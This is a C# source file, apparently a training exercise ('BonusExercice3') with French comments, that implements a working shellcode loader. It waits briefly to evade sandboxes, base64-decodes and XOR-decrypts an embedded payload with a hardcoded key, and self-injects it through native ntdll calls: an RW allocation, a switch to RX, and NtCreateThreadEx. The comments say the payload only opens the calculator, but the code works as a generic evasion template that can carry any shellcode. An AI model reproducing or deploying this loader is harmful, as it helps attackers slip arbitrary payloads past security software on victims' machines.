using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using System.Threading;

namespace BonusExercice3
{
    class Program
    {
        // --- CONSTANTES ---
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_READWRITE = 0x04;    // RW
        const uint PAGE_EXECUTE_READ = 0x20; // RX

        // --- IMPORTS NATIFS ---
        [DllImport("ntdll.dll")]
        public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [DllImport("ntdll.dll")]
        public static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [DllImport("ntdll.dll")]
        public static extern uint NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr bytesBuffer);

        [DllImport("kernel32.dll")]
        public static extern uint WaitForSingleObject(IntPtr handle, uint ms);

        // --- DECHIFFREMENT ---
        private static byte[] DecryptXor(byte[] input, byte[] key)
        {
            byte[] output = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                output[i] = (byte)(input[i] ^ key[i % key.Length]);
            }
            return output;
        }

        static void Main()
        {
            // 1. Petite pause (Anti-Sandbox)
            Thread.Sleep(1000);


            string dataBS64 = "tHzgr8OdslA0NXRgcR4aZTUDAqcXGL9nVXm7HFB86BkTPfkiZH06hnoEBQWqAwK13mxVSTcdEA+J/W4KMrSQvWZ0ZHm7HGi/IXd7dKLbtL01MTAGzfQXLHt0ogC/fS11uw5ofWKb0CM6r/10vgW4BkniLnr6PUOQmHT0+D0PSfVbq0aEPlN4ET10CZ897DsPuDVWGTXlU3C7QgBw6AsvPHOAdb4xuXhPmHU7CmsrKwp1bXRocRQAt49rcieNsGx0bGt4xVrdNLTMii8YjjQ1MTBOSDRjA774c1E0NXSLAcUns5yeiIXH8mJ0j5el89XLtgOwsVpsMkk/scuuPTHYDCAHHTo0bHS46rGdVwInUFsXKFE1";

            string keyStr = "H4cK3urP45510N";

            Console.WriteLine("[*] Déchiffrement...");
            byte[] shellcode = DecryptXor(Convert.FromBase64String(dataBS64), Encoding.ASCII.GetBytes(keyStr));

            // On s'injecte soi-même (Self-Injection)
            IntPtr hProc = Process.GetCurrentProcess().Handle;
            IntPtr baseAddr = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            // 3. Allocation (RW)
            NtAllocateVirtualMemory(hProc, ref baseAddr, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            // 4. Copie du shellcode
            Marshal.Copy(shellcode, 0, baseAddr, shellcode.Length);

            // 5. Protection (RX) - On change les droits juste avant d'exécuter
            uint oldProtect = 0;
            NtProtectVirtualMemory(hProc, ref baseAddr, ref regionSize, PAGE_EXECUTE_READ, out oldProtect);

            // 6. Exécution via Thread Natif
            IntPtr hThread = IntPtr.Zero;
            NtCreateThreadEx(out hThread, 0x1FFFFF, IntPtr.Zero, hProc, baseAddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

            // On attend juste assez pour que la calc se lance, puis on quitte
            WaitForSingleObject(hThread, 0xFFFFFFFF);

            // Le programme se ferme, la calculatrice reste.
        }
    }
}
